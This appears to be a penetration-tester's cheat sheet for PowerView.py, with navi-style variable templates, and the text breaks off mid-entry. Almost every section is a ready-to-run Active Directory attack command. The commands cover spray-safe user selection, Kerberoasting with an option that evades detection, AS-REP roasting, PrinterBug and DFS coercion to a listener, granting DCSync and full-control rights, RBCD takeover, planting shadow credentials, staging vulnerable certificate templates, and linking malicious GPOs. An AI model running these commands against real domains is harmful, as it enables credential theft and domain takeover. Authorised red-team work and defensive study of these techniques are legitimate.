# PowerView.py

<!-- cheat
export pvpy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

var transport = printf 'ldap\tLDAP (default, 389)\nldaps\tLDAPS (636, TLS)\ngc\tGlobal Catalog (3268)\ngc-ldaps\tGlobal Catalog over TLS (3269)\nadws\tADWS (9389)\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ transport" --map "cut -f1"

if $transport == ldap
var transport_flag
fi

if $transport == ldaps
var transport_flag := --use-ldaps
fi

if $transport == gc
var transport_flag := --use-gc
fi

if $transport == gc-ldaps
var transport_flag := --use-gc-ldaps
fi

if $transport == adws
var transport_flag := --use-adws
fi

if $auth_method == hash
var auth_target := $domain/$user@$rhost_ip -H :$credential $transport_flag
fi

if $auth_method == password
var auth_target := $domain/$user:'$credential'@$rhost_ip $transport_flag
fi

if $auth_method == kerberos
var auth_target := $domain/$user@$rhost_ip -k $transport_flag
fi
-->

## Connect

### Open PowerView session

Drop into the interactive PowerView shell against the target DC. Every subcommand below assumes you are inside this prompt.

```sh title:"PowerView.py Interactive PowerView session, all commands run inside"
powerview $auth_target
```
<!-- cheat
import domain_ip
import users
import passwords
import pvpy_auth
-->

## User Enumeration

### Safe spray candidates

Returns users whose `badPwdCount` is zero - one spray attempt won't tip them toward lockout. Low-noise starting set.

```sh title:"PowerView.py Zero badPwdCount, safe to spray once"
Get-DomainUser -Where 'badPwdCount contains 0'
```
<!-- cheat -->

### Kerberos encryption support

Lists every account with an SPN plus its supported encryption types. AES-capable accounts pair well with `-Opsec` Kerberoasting.

```sh title:"PowerView.py SPN accounts with msDS-SupportedEncryptionTypes"
Get-DomainUser -SPN -Select samaccountname,msDS-SupportedEncryptionTypes
```
<!-- cheat -->

### Privileged users

Pulls accounts flagged `adminCount=1` - the historic marker for protected admin group members. Fast high-value target map.

```sh title:"PowerView.py adminCount=1, high-value targets"
Get-DomainUser -AdminCount
```
<!-- cheat -->

### ASREPRoastable users

Finds accounts with Kerberos pre-auth disabled. AS-REPs can be requested anonymously and cracked offline.

```sh title:"PowerView.py DONT_REQ_PREAUTH set, AS-REP crackable offline"
Get-DomainUser -PreAuthNotRequired
```
<!-- cheat -->

### Unconstrained delegation users

Lists users trusted for unconstrained delegation. Any TGT sent here is reusable - including DC machine TGTs after coercion.

```sh title:"PowerView.py TRUSTED_FOR_DELEGATION, reusable TGT primitive"
Get-DomainUser -Unconstrained
```
<!-- cheat -->

### Constrained delegation users

Returns users with `TrustedToAuthForDelegation`. The principal can S4U2Proxy to its allowed SPNs as any user.

```sh title:"PowerView.py S4U2Proxy-capable principals (constrained delegation)"
Get-DomainUser -TrustedToAuth
```
<!-- cheat -->

### Locked out accounts

Surfaces currently-locked accounts. Skip these during sprays and flag if you spot a lockout sweep in progress.

```sh title:"PowerView.py Currently locked accounts, do not spray"
Get-DomainUser -LockedOut
```
<!-- cheat -->

### Disabled accounts

Lists disabled users. Often hides stale SPNs, pre-auth-disabled relics, and forgotten service identities worth resurrecting.

```sh title:"PowerView.py Disabled users, gold mine for stale SPNs / pre-auth"
Get-DomainUser -Disabled
```
<!-- cheat -->

### Users with expired passwords

Returns accounts whose password has expired - stale identities that may carry weak or known credentials.

```sh title:"PowerView.py Expired passwords, often stale or weak creds"
Get-DomainUser -PassExpired
```
<!-- cheat -->

### Users abused for RBCD

Finds users set as principals in `msDS-AllowedToActOnBehalfOfOtherIdentity`. Reveals existing RBCD takeover paths.

```sh title:"PowerView.py Already configured as RBCD principal"
Get-DomainUser -RBCD
```
<!-- cheat -->

### Users with shadow credentials

Lists users with `msDS-KeyCredentialLink` populated - usually evidence of a shadow-credentials primitive already in place.

```sh title:"PowerView.py msDS-KeyCredentialLink set, shadow creds primitive"
Get-DomainUser -ShadowCred
```
<!-- cheat -->

### Users by department

Search by `department` attribute. Pivot from org chart to specific business units.

```sh title:"PowerView.py Pivot by department attribute"
Get-DomainUser -Department "$department"
```
<!-- cheat
var department --- --header "Department name (e.g. IT)"
-->

### Users by group membership

Returns members of the named group. Quick way to enumerate any privileged or sensitive group.

```sh title:"PowerView.py Members of a target group"
Get-DomainUser -MemberOf "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

## Computer Enumeration

### LAPS-enabled computers

Lists computers with LAPS populated. If your principal can read `ms-Mcs-AdmPwd`, the local admin password comes back directly.

```sh title:"PowerView.py LAPS-protected hosts, password readable if ACL allows"
Get-DomainComputer -LAPS
```
<!-- cheat -->

### Unconstrained delegation (non-DC)

Finds unconstrained-delegation hosts excluding DCs. These can be coerced and used to capture TGTs from arbitrary principals.

```sh title:"PowerView.py Coercion targets that aren't DCs"
Get-DomainComputer -Unconstrained -ExcludeDCs
```
<!-- cheat -->

### Domain printers

Lists computers registered as print servers - the classic PrinterBug coercion surface.

```sh title:"PowerView.py Print servers, PrinterBug coercion candidates"
Get-DomainComputer -Printers
```
<!-- cheat -->

### Obsolete operating systems

Returns hosts running unsupported Windows versions. Usually unpatched and easy pivots.

```sh title:"PowerView.py Unsupported Windows versions, soft pivots"
Get-DomainComputer -Obsolete
```
<!-- cheat -->

### Computers with resolved IPs

Renders computer objects alongside resolved IPs in a table - quick target map straight out of DNS.

```sh title:"PowerView.py Computer + resolved IP, fast target map"
Get-DomainComputer -IncludeIP -Properties dnshostname -TableView
```
<!-- cheat -->

### Pre-Windows 2000 computers

Finds hosts flagged pre-Windows 2000 compatible. Often legacy/misconfigured and worth a closer look.

```sh title:"PowerView.py Legacy pre-Windows 2000 compatible hosts"
Get-DomainComputer -Pre2K
```
<!-- cheat -->

### BitLocker recovery keys

Lists computers with a BitLocker recovery key stored in AD. Readable keys unlock encrypted volumes.

```sh title:"PowerView.py BitLocker recovery keys stored in AD"
Get-DomainComputer -BitLocker
```
<!-- cheat -->

### Readable gMSA passwords

Returns computers whose gMSA password the current principal can read. Decoded directly to NT hash by PowerView.

```sh title:"PowerView.py gMSA passwords readable as current principal"
Get-DomainComputer -GMSAPassword
```
<!-- cheat -->

## Group & ACL Operations

### List group members

Enumerates members of a target group. Run against privileged groups to identify operators worth targeting.

```sh title:"PowerView.py Members of group, find operators worth targeting"
Get-DomainGroupMember -Identity "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

### Groups a user belongs to

Lists every group the user is a member of - effective access and inherited permissions in one view.

```sh title:"PowerView.py Every group a user inherits access from"
Get-DomainGroup -MemberIdentity $target_user
```
<!-- cheat
var target_user --- --header "User samAccountName"
-->

### ACLs for an object

Reads the DACL and resolves GUIDs to readable rights. The first step in finding misconfigured permissions.

```sh title:"PowerView.py DACL with GUIDs resolved to readable rights"
Get-DomainObjectAcl -Identity "$identity" -ResolveGUIDs
```
<!-- cheat
var identity --- --header "Object identity (samAccountName, DN, SID)"
-->

### ACLs by SID

Filters ACEs to those granted to a specific SID. Answers "what can this principal do to that object?" in one shot.

```sh title:"PowerView.py Filter ACEs by SecurityIdentifier"
Get-DomainObjectAcl -Identity $identity -SecurityIdentifier $sid
```
<!-- cheat
var identity --- --header "Target object (e.g. DC01)"
var sid --- --header "SecurityIdentifier (S-1-5-21-...)"
-->

### Object owner

Returns the security-descriptor owner of an object. Owners hold implicit `WriteDacl`, so this often reveals control paths.

```sh title:"PowerView.py Owner holds implicit WriteDacl, reveals control paths"
Get-DomainObjectOwner -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity"
-->

## DNS Operations

### List DNS zones

Enumerates the AD-integrated DNS zones in the current domain. The starting point for DNS recon.

```sh title:"PowerView.py AD-integrated DNS zones in current domain"
Get-DomainDNSZone
```
<!-- cheat -->

### List forest DNS zones

Lists DNS zones stored in the forest-wide partition. Often exposes zones invisible at the domain level.

```sh title:"PowerView.py Forest-partition DNS zones, often missed at domain level"
Get-DomainDNSZone -Forest
```
<!-- cheat -->

### Records in a DNS zone

Dumps the records of a given DNS zone. Map hosts and services without sending any probes.

```sh title:"PowerView.py Dump records in a zone (zero-noise host mapping)"
Get-DomainDNSRecord -ZoneName $zone
```
<!-- cheat
var zone --- --header "DNS zone (e.g. domain.local)"
-->

### Add DNS record

Creates a new A record in the configured zone. Stages WPAD, MITM, or coercion redirects.

```sh title:"PowerView.py Plant A record for WPAD / MITM / coercion"
Add-DomainDNSRecord -RecordName $record -RecordAddress $lhost
```
<!-- cheat
import tun_ip
var record --- --header "Record name"
-->

### Disable DNS record

Soft-disables a DNS record by pointing it to an invalid address. Removes the entry without losing the object.

```sh title:"PowerView.py Soft-disable without deleting the object"
Disable-DomainDNSRecord -RecordName $record
```
<!-- cheat
var record --- --header "Record name to disable"
-->

## Kerberos Attacks

### Kerberoast all SPNs

Requests service tickets for every SPN-bearing account and returns crackable hashes. Standard offline attack on service accounts.

```sh title:"PowerView.py Roast every SPN, crack hashes offline"
Invoke-Kerberoast
```
<!-- cheat -->

### Kerberoast (OPSEC AES)

Requests AES-encrypted service tickets only - looks normal to detections tuned for RC4 roasting. Trades speed for stealth.

```sh title:"PowerView.py AES-only roast, evades RC4-tuned detections"
Invoke-Kerberoast -Opsec
```
<!-- cheat -->

### ASREPRoast

Requests AS-REPs for every pre-auth-disabled account. Works without valid credentials when fed a userlist.

```sh title:"PowerView.py Crackable AS-REP hashes for pre-auth-disabled accounts"
Invoke-ASREPRoast
```
<!-- cheat -->

## Delegation

### Find RBCD configurations

Searches AD for accounts with `msDS-AllowedToActOnBehalfOfOtherIdentity` set. Reveals existing RBCD paths.

```sh title:"PowerView.py Existing AllowedToActOnBehalfOfOtherIdentity entries"
Get-DomainRBCD
```
<!-- cheat -->

### Set RBCD delegation

Writes an RBCD entry so the attacker-controlled computer can S4U2Proxy to the target as any user. Classic RBCD takeover.

```sh title:"PowerView.py delegate_from can impersonate any user to delegate_to"
Set-DomainRBCD -Identity $target -DelegateFrom $attacker
```
<!-- cheat
var target --- --header "Target computer (e.g. targetcomputer$)"
var attacker --- --header "Attacker computer (e.g. attackercomputer$)"
-->

## Certificate Services

### Vulnerable certificate templates

Lists ADCS templates with known-bad configurations and resolves their ACL SIDs. Targets for ESC1/2/3/etc.

```sh title:"PowerView.py ESC-vulnerable templates with resolved ACL SIDs"
Get-DomainCATemplate -Vulnerable -ResolveSIDs
```
<!-- cheat -->

### List CAs with checks

Enumerates CAs in the forest and runs web-enrollment / config checks. Quick ADCS surface health check.

```sh title:"PowerView.py CA list with web enrollment + config checks"
Get-DomainCA -CheckAll
```
<!-- cheat -->

## Shadow Credentials

### Add shadow credential

Adds a key credential to `msDS-KeyCredentialLink`. The attacker can then PKINIT as the target.

```sh title:"PowerView.py Plant key credential for PKINIT-as-target"
Set-ShadowCredential -Identity $target -Add
```
<!-- cheat
var target --- --header "Target identity"
-->

### List shadow credentials

Reads the key credentials currently set on a target. Audit or cleanup primitive.

```sh title:"PowerView.py Read existing KeyCredentialLink entries"
Get-ShadowCredential -Identity $target
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
-->

## Service Accounts

### List gMSA accounts

Enumerates group-managed service accounts. If the current principal can read the managed password, it comes back here.

```sh title:"PowerView.py gMSAs in domain, auto-decoded if readable"
Get-DomainGMSA
```
<!-- cheat -->

### List dMSA accounts

Lists delegated managed service accounts - the newer cousin of gMSA, worth checking on modern domains.

```sh title:"PowerView.py dMSAs in domain (BadSuccessor primitive)"
Get-DomainDMSA
```
<!-- cheat -->

## Remote Computer Operations

### Remote sessions

Queries logon sessions over SMB. Reveals who is currently signed in for session hunting.

```sh title:"PowerView.py NetSessionEnum, who is signed in right now"
Get-NetSession -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer (e.g. DC01)"
-->

### List remote shares

Enumerates SMB shares exposed by a remote host. Step zero before file hunting.

```sh title:"PowerView.py SMB shares on host, step zero for file hunting"
Get-NetShare -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### List running services

Lists services currently running on a remote host. Spot EDR, agents, and service-account abuse openings.

```sh title:"PowerView.py Running services, spot EDR / service-account abuse"
Get-NetService -Computer $computer -IsRunning
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Login events from remote host

Pulls recent successful-logon events from a remote security log. Maps who has been touching the host.

```sh title:"PowerView.py Recent 4624 events, who has been on this host"
Get-EventLog -Computer $computer -EventId $eventid -MaxEvents $max
```
<!-- cheat
var computer --- --header "Remote computer"
var eventid := 4624
var max := 50
-->

### List remote processes

Enumerates running processes on a remote host. Finds interactive users and EDR agents.

```sh title:"PowerView.py Remote process list, spot users and EDR agents"
Get-NetProcess -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Find local admin access

Sweeps the domain for machines where the current principal is local admin. Lateral-movement target list in one call.

```sh title:"PowerView.py Domain-wide local admin sweep for current principal"
Find-LocalAdminAccess
```
<!-- cheat -->

## Coercion Attacks

### PrinterBug coercion

Triggers the Print Spooler RPC bug to force the target into authenticating to your listener. Classic machine-account capture primitive.

```sh title:"PowerView.py MS-RPRN coercion, capture/relay target machine auth"
Invoke-PrinterBug -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target (e.g. DC01)"
-->

### DFS coercion

Forces the target to authenticate via the DFS-NS RPC interface. Works when PrinterBug and PetitPotam are patched.

```sh title:"PowerView.py MS-DFSNM coercion, fallback when PrinterBug is patched"
Invoke-DFSCoerce -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target"
-->

## Object Modification

### Set object attribute

Overwrites a single attribute on a domain object. Building block for many AD abuses (SPN write, description tampering, etc.).

```sh title:"PowerView.py Overwrite attribute (destructive single-value set)"
Set-DomainObject -Identity $identity -Set '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. description)"
var value --- --header "Attribute value"
-->

### Append attribute value

Appends to a multi-valued attribute instead of overwriting. Add a new SPN without nuking existing ones.

```sh title:"PowerView.py Append to multi-value attribute, non-destructive"
Set-DomainObject -Identity $identity -Append '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. servicePrincipalname)"
var value --- --header "Value to append"
-->

### Clear attribute

Clears an attribute on a domain object. Cleanup primitive or SPN reset.

```sh title:"PowerView.py Clear attribute, cleanup / reset primitive"
Set-DomainObject -Identity $identity -Clear $attribute
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name to clear"
-->

### Set attribute from file

Sets an attribute's value from a local file. Useful for stuffing binary blobs like `msDS-KeyCredentialLink` payloads.

```sh title:"PowerView.py Load binary blob from file (e.g. KeyCredentialLink)"
Set-DomainObject -Identity $identity -Set '$attribute=@$filepath'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name"
var filepath --- --header "Path to file (e.g. /path/to/file)"
-->

### Change user password

Resets a user's password to a new value. Requires `User-Force-Change-Password` or equivalent ACL on the target.

```sh title:"PowerView.py Force-reset, needs Force-Change-Password right"
Set-DomainUserPassword -Identity $target_user -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "Target user"
-->

### Move object to OU

Moves a domain object to a different OU by rewriting its DN. Stages OU-linked GPO attacks.

```sh title:"PowerView.py Move object into target OU (GPO link staging)"
Set-DomainObjectDN -Identity $identity -DestinationDN "$dn"
```
<!-- cheat
var identity --- --header "Target object"
var dn --- --header "Destination DN (e.g. OU=IT,DC=domain,DC=local)"
-->

## Output Formatting

### Table view

Renders query results as a console table for the chosen properties. The most readable default for ad-hoc exploration.

```sh title:"PowerView.py Console table view for chosen properties"
Get-DomainUser -Properties $properties -TableView
```
<!-- cheat
var properties := samaccountname,description
-->

### Markdown table output

Renders results as a Markdown table - ready to paste into notes or reports.

```sh title:"PowerView.py Markdown table for notes / reports"
Get-DomainUser -Properties $properties -TableView md
```
<!-- cheat
var properties := samaccountname,description
-->

### CSV output

Emits results as CSV. Pipe into scripts or spreadsheets for bulk wrangling.

```sh title:"PowerView.py CSV output for piping / spreadsheets"
Get-DomainUser -Properties $properties -TableView csv
```
<!-- cheat
var properties := samaccountname,description
-->

### Filter: contains

Filters where the named attribute contains the given substring. Loose match for free-form fields.

```sh title:"PowerView.py Loose substring match on attribute"
Get-DomainUser -Where 'samaccountname contains $value'
```
<!-- cheat
var value --- --header "Substring to match (e.g. admin)"
-->

### Filter: equals

Filters to exact, case-insensitive matches on the attribute.

```sh title:"PowerView.py Exact (case-insensitive) attribute match"
Get-DomainUser -Where 'samaccountname eq $value'
```
<!-- cheat
var value --- --header "Exact value (e.g. Administrator)"
-->

### Filter: in

Filters where the value appears within the attribute - effectively a reverse-`contains` for token lookups.

```sh title:"PowerView.py Token lookup inside attribute (reverse contains)"
Get-DomainUser -Where 'description in $value'
```
<!-- cheat
var value --- --header "Token to look for (e.g. password)"
-->

### Sort results

Sorts the result set by the chosen attribute. Pairs with table or CSV output for tidy reports.

```sh title:"PowerView.py Sort by attribute, pair with table/CSV"
Get-DomainUser -Properties $properties -SortBy $sortby
```
<!-- cheat
var properties := samaccountname,lastLogon
var sortby := lastLogon
-->

### Count enabled users

Returns the count of enabled accounts rather than the rows. Quick sanity check on domain size.

```sh title:"PowerView.py Enabled-user count, fast domain sanity check"
Get-DomainUser -Enabled -Count
```
<!-- cheat -->

## Domain & Forest Info

### Domain info

Reads the domain object including useful policy properties - check `ms-DS-MachineAccountQuota` before adding machine accounts.

```sh title:"PowerView.py Domain object + policy props (e.g. MachineAccountQuota)"
Get-Domain -Properties $properties
```
<!-- cheat
var properties := ms-DS-MachineAccountQuota
-->

### List domain controllers

Lists the DCs visible from this principal. Pick a DC before further operations.

```sh title:"PowerView.py Visible DCs, pick one for follow-up ops"
Get-DomainController -Properties dnshostname,operatingsystem
```
<!-- cheat -->

### List OUs

Enumerates organisational units in the domain. Pair with `-Writable` to find OUs you can manipulate.

```sh title:"PowerView.py OUs in domain, GPLink resolved"
Get-DomainOU -ResolveGPLink
```
<!-- cheat -->

### Writable OUs

Returns OUs the current principal can write to - building block for GPO link abuse.

```sh title:"PowerView.py OUs writable by current principal (GPO link abuse)"
Get-DomainOU -Writable
```
<!-- cheat -->

### Raw object lookup

Fetches any domain object by identity or LDAP filter. The escape hatch when no dedicated `Get-*` fits.

```sh title:"PowerView.py Escape hatch for any object by identity/filter"
Get-DomainObject -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity (e.g. DC01$)"
-->

### Tombstoned objects

Lists objects in the Deleted Objects container. Step zero before restoring a removed object.

```sh title:"PowerView.py Deleted Objects container, restore candidates"
Get-DomainObject -Deleted
```
<!-- cheat -->

### Restore deleted object

Restores a tombstoned object back into the directory, optionally into a chosen target OU.

```sh title:"PowerView.py Reanimate tombstoned object into target OU"
Restore-DomainObject -Identity $identity -TargetPath "$dn"
```
<!-- cheat
var identity --- --header "Deleted object (e.g. deleteduser)"
var dn --- --header "Target DN (e.g. OU=Users,DC=domain,DC=local)"
-->

### Set object owner

Rewrites the security-descriptor owner of a target object. Owners hold implicit `WriteDacl` - classic ACL takeover step.

```sh title:"PowerView.py WriteOwner abuse, take ownership of target"
Set-DomainObjectOwner -TargetIdentity "$target" -PrincipalIdentity $principal
```
<!-- cheat
var target --- --header "Target object DN/identity"
var principal --- --header "New owner principal (e.g. lowpriv)"
-->

### Clear LDAP cache

Drops PowerView's in-memory LDAP query cache so the next query hits the wire. Chases fresh changes.

```sh title:"PowerView.py Drop LDAP cache to hit the wire next query"
Clear-Cache
```
<!-- cheat -->

## Account State

### Disable account

Disables a domain account. Freeze a target during an op or clean up a rogue identity.

```sh title:"PowerView.py Set ACCOUNTDISABLE bit on target"
Disable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Enable account

Clears `ACCOUNTDISABLE` on a disabled account. Wakes a stale identity for an attack chain.

```sh title:"PowerView.py Clear ACCOUNTDISABLE bit, wake stale account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Unlock account

Clears the lockout flag on an account. Use after over-spraying a real user.

```sh title:"PowerView.py Unlock account after aggressive spray"
Unlock-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Locked account (e.g. lockeduser)"
-->

### Switch session credentials

Re-authenticates the current PowerView session as a different user without exiting. Pivot between captured creds in-place.

```sh title:"PowerView.py Swap identity inside the same PowerView session"
Login-As -Username $target_user -Domain $domain -Password '$new_password'
```
<!-- cheat
import domain_ip
import passwords
var target_user --- --header "Username"
-->

## Object Lifecycle

### Add domain user

Creates a new domain user. Requires sufficient ACL rights on the target container.

```sh title:"PowerView.py Create new user, needs container write rights"
Add-DomainUser -UserName $target_user -Password '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "New username"
-->

### Remove domain user

Deletes a domain user. Watch out for tombstone behaviour and dependencies.

```sh title:"PowerView.py Delete user (mind tombstones + dependencies)"
Remove-DomainUser -Identity $target_user
```
<!-- cheat
var target_user --- --header "User to delete"
-->

### Add domain computer

Adds a machine account to the domain - bounded by `ms-DS-MachineAccountQuota`. Building block for RBCD and shadow creds.

```sh title:"PowerView.py Create machine account (needs MachineAccountQuota > 0)"
Add-DomainComputer -ComputerName $rhost_name -ComputerPass $new_password
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer name (no trailing $)"
-->

### Remove domain computer

Deletes a machine account. Cleanup after RBCD or shadow-creds chains.

```sh title:"PowerView.py Clean up attacker-created machine account"
Remove-DomainComputer -ComputerName $rhost_name
```
<!-- cheat
var rhost_name --- --header "Computer name"
-->

### Reset computer password

Forces a new password onto a computer account. Reset machine creds you control or recover an owned host.

```sh title:"PowerView.py Force-reset machine account password"
Set-DomainComputerPassword -Identity '$rhost_name' -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer (e.g. COMPUTER01$)"
-->

### Add domain group

Creates a new security group. Stage a group for GPO or ACL abuse.

```sh title:"PowerView.py Stage new security group for ACL/GPO abuse"
Add-DomainGroup -Identity "$group"
```
<!-- cheat
var group --- --header "New group name"
-->

### Add user to group

Adds a principal to a target group. Classic privesc primitive once you can write to the group.

```sh title:"PowerView.py Membership privesc, write-to-group primitive"
Add-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group (e.g. Domain Admins)"
var target_user --- --header "Member to add"
-->

### Remove user from group

Removes a principal from a group. Cleanup or competitor kick.

```sh title:"PowerView.py Drop membership, cleanup after privesc"
Remove-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group"
var target_user --- --header "Member to remove"
-->

### Add OU

Creates a new organisational unit. Pair with GPO link primitives to attack accounts moved into it.

```sh title:"PowerView.py Stage new OU for GPO link attacks"
Add-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "New OU name"
-->

### Remove OU

Deletes an OU. Be careful - child objects move or vanish depending on flags.

```sh title:"PowerView.py Delete OU (children move or vanish per flags)"
Remove-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "OU to delete"
-->

### Generic object remove

Deletes any domain object by identity. Catch-all for unusual classes.

```sh title:"PowerView.py Catch-all delete for any object class"
Remove-DomainObject -Identity $identity
```
<!-- cheat
var identity --- --header "Object to delete"
-->

## ACL Editing

### Grant DCSync rights

Grants `DS-Replication-Get-Changes` + `-All` on the domain to a principal. Sets up the classic DCSync primitive.

```sh title:"PowerView.py Grant Get-Changes + Get-Changes-All on domain root"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights dcsync
```
<!-- cheat
var target --- --header "Target object (usually domain root or DC)"
var principal --- --header "Principal to grant rights to"
-->

### Grant full control ACL

Grants `GenericAll` over a target object. Sweeping primitive used in many ACL takeover chains.

```sh title:"PowerView.py Grant GenericAll, full ACL takeover"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights fullcontrol
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to grant rights to"
-->

### Grant RBCD ACL

Writes the RBCD descriptor on the target so the principal can S4U2Proxy as anyone. ACL-based RBCD staging.

```sh title:"PowerView.py Grant RBCD via ACL, principal can S4U2Proxy as anyone"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights RBCD
```
<!-- cheat
var target --- --header "Target computer (e.g. SQL03)"
var principal --- --header "Attacker-controlled computer (e.g. POC113)"
-->

### Remove ACL entry

Removes a previously granted right from the target's DACL. Cleanup primitive for ACL chains.

```sh title:"PowerView.py Strip granted right, cleanup after ACL chain"
Remove-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to remove"
var rights --- --header "Rights to remove (e.g. dcsync)"
-->

## GPO

### List GPOs

Enumerates Group Policy Objects in the domain. Inspect `gpcfilesyspath` to find writable policies.

```sh title:"PowerView.py GPO list with displayname + gpcfilesyspath"
Get-DomainGPO -Properties displayname,gpcfilesyspath
```
<!-- cheat -->

### GPO local group settings

Reads Restricted Groups / GPP entries that assign local group membership via GPO. Excellent source of lateral movement clues.

```sh title:"PowerView.py Restricted Groups / GPP local group assignments"
Get-DomainGPOLocalGroup -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name (e.g. Default Domain Policy)"
-->

### Dump GPO settings

Parses and dumps the settings of a GPO. Understand what a policy actually does before tampering.

```sh title:"PowerView.py Parse + dump GPO settings before tampering"
Get-DomainGPOSettings -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name"
-->

### Link GPO to OU

Links an existing GPO to an OU or container. Follow-up after staging or hijacking a malicious GPO.

```sh title:"PowerView.py Link (malicious) GPO to OU/container"
Add-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID (e.g. {31B2F340-016D-11D2-945F-00C04FB984F9})"
var target --- --header "Target OU/container DN"
-->

### Unlink GPO

Removes a GPO link from a target OU/container. Cleanup primitive after GPO abuse.

```sh title:"PowerView.py Unlink GPO from target, cleanup after abuse"
Remove-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID"
var target --- --header "Target OU/container DN"
-->

### Create new GPO

Creates a brand new GPO and optionally links it. Stage your own policy when you can't modify an existing one.

```sh title:"PowerView.py Create + link new GPO when none are writable"
Add-DomainGPO -Identity "$name" -LinkTo "$target"
```
<!-- cheat
var name --- --header "New GPO name"
var target --- --header "OU/container DN to link to"
-->

## Domain Trusts & Forest

### List domain trusts

Lists trust relationships of the current domain. Foundation for cross-domain enumeration.

```sh title:"PowerView.py Map inbound/outbound trusts across the domain"
Get-DomainTrust -Properties trustDirection,trustPartner
```
<!-- cheat -->

### Domain trust keys

Reads the trust account keys stored in AD. Sensitive material - enables inter-realm forgeries when accessible.

```sh title:"PowerView.py Trust account keys, inter-realm forgery material"
Get-DomainTrustKey
```
<!-- cheat -->

### Foreign users

Lists users from other domains added inside this one. Reveals cross-domain paths via foreign security principals.

```sh title:"PowerView.py Foreign users granted access inside this domain"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Lists groups in this domain that contain members from another. Maps inbound cross-trust access.

```sh title:"PowerView.py Inbound cross-trust access via foreign group members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

## ADCS Additions

### Modify CA template

Edits attributes on a certificate template (e.g. EKU values). Building block for ADCS misconfig abuse.

```sh title:"PowerView.py Overwrite template attribute (e.g. EKU)"
Set-DomainCATemplate -Identity $template -Set '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute (e.g. pKIExtendedKeyUsage)"
var value --- --header "Value (e.g. Client Authentication)"
-->

### Append to CA template

Appends to a multi-valued template attribute without overwriting the rest.

```sh title:"PowerView.py Append to multi-value template attribute"
Set-DomainCATemplate -Identity $template -Append '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute"
var value --- --header "Value to append"
-->

### Clear CA template attribute

Clears an attribute on a CA template. Cleanup after template tampering.

```sh title:"PowerView.py Clear template attribute, cleanup after tampering"
Set-DomainCATemplate -Identity $template -Clear $attribute
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute to clear"
-->

### Duplicate CA template

Adds a new CA template by duplicating an existing one. Stage a controlled vulnerable template.

```sh title:"PowerView.py Clone template, stage controlled vulnerable copy"
Add-DomainCATemplate -Duplicate $source -Name $name -DisplayName "$display"
```
<!-- cheat
var source --- --header "Source template to duplicate"
var name --- --header "New template name"
var display --- --header "New template display name"
-->

### Add ACL to CA template

Grants rights (`Enroll`, `Write`, `All`) on a certificate template to a principal. Plant your own enrolment access.

```sh title:"PowerView.py Grant Enroll/Write/All on template to principal"
Add-DomainCATemplateAcl -Template $template -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var template --- --header "Template name"
var principal --- --header "Principal to grant rights to"
var rights --- --header "Rights (e.g. Enroll)"
-->

### Remove CA template

Removes a certificate template from AD CS. Cleanup after planting and abusing a template.

```sh title:"PowerView.py Delete template, cleanup after abuse"
Remove-DomainCATemplate -Identity $template
```
<!-- cheat
var template --- --header "Template to remove"
-->

## Service Accounts (gMSA/dMSA)

### Add gMSA

Creates a gMSA with a chosen `PrincipalsAllowedToRetrieveManagedPassword`. Stage a controllable gMSA for testing.

```sh title:"PowerView.py Create gMSA with chosen password retrievers"
Add-DomainGMSA -Identity $name -PrincipalsAllowedToRetrieveManagedPassword "$principal"
```
<!-- cheat
var name --- --header "New gMSA name"
var principal --- --header "Principal allowed to retrieve password (e.g. Domain Admins)"
